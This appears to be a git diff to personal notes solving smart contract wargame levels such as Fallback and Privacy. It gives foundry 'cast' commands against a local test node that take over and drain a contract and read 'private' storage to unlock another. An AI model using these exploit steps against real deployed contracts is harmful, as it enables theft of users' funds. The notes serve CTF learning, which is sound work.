@@ -1,5 +1,11 @@
 # notes
 
+## Fallback:
+
+1. `cast send <CONTRACT-ADDRESS> "contribute()" --value 0.001ether --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`
+2. `cast send <CONTRACT-ADDRESS> --value 0.0001ether --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`
+3. `cast send <CONTRACT-ADDRESS> "withdraw()" --private-key <PRIVATE-KEY> --rpc-url http://localhost:8545`
+
 ## Token:
 
 paste this line in command:
@@ -84,3 +90,33 @@ Re-entrancy is a common attack. You should always be prepared for it!
 **The DAO Hack**
 
 The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. [See 15 lines of code that could have prevented TheDAO Hack.](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942)
+
+
+## Privacy
+
+The contract is storing secret data in **contract's storage** like below:
+
+```
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(block.timestamp);
+  bytes32[3] private data;
+```
+
+now the contract's storage slot looks like:
+
+```
+#0 => bool locked
+#1 => uint256 ID
+#2 => uint8 flattening + uint8 denomination + uint16 awkardness
+#3 => bytes32 data[0]
+#4 => bytes32 data[1]
+#5 => bytes32 data[2]
+```
+
+- get the `bytes32 data[2]` from **storage slot #5** using `cast storage <CONTRACT-ADDRESS> 5`
+- take the first **16-bytes** and attach `0x` infront of it and send it the contract
+- `cast send <CONTRACT-ADDRESS> "unlock(bytes16)" 768154e92adb5f1901c74c0fbb0faadd --rpc-url http://localhost:8545 --private-key <PRIVATE-KEY>`
+- now check the **storage slot #0** if it is 0. the level is done
